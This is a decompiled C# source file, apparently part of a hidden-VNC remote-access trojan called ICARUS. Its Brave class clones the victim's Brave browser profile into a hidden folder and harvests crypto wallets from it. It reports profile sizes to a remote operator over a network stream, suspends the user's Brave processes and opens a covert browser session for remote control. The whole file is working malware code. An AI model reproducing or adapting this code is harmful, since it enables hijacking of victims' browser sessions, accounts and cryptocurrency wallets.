using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser;

public class Brave
{
	private const short SWP_NOMOVE = 2;

	private const short SWP_NOSIZE = 1;

	private const short SWP_NOZORDER = 4;

	private const int SWP_SHOWWINDOW = 64;

	[DllImport("user32.dll")]
	public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

	public static void StartBrave(bool duplicate)
	{
		try
		{
			if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\ICARUS\\lockfile"))))
			{
				Outils.SendInformation(Outils.nstream, "25|Brave has already been opened!");
				return;
			}
			if (duplicate)
			{
				Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
				MonitorDirSize monitorDirSize = new MonitorDirSize();
				monitorDirSize.StartMonitoring(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\ICARUS\\");
				try
				{
					Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data", Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\ICARUS\\", overwrite: true);
					HVNC.GetChromeWallets(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\ICARUS\\");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				monitorDirSize.StopMonitoring();
				Outils.SendInformation(Outils.nstream, "206|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
			}
			else
			{
				Outils.SendInformation(Outils.nstream, "207|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\User Data") / 1024.0 / 1024.0)));
			}
			Process[] processesByName = Process.GetProcessesByName("brave");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.SuspendProcess(processesByName[i]);
			}
			Process.Start("brave", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\BraveSoftware\\Brave-Browser\\ICARUS\" \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
			{
				Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
				Brave.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
				Application.DoEvents();
				if (stopwatch.ElapsedMilliseconds >= 10000)
				{
					return;
				}
			}
			stopwatch.Stop();
			processesByName = Process.GetProcessesByName("brave");
			for (int i = 0; i < processesByName.Length; i++)
			{
				Outils.ResumeProcess(processesByName[i]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
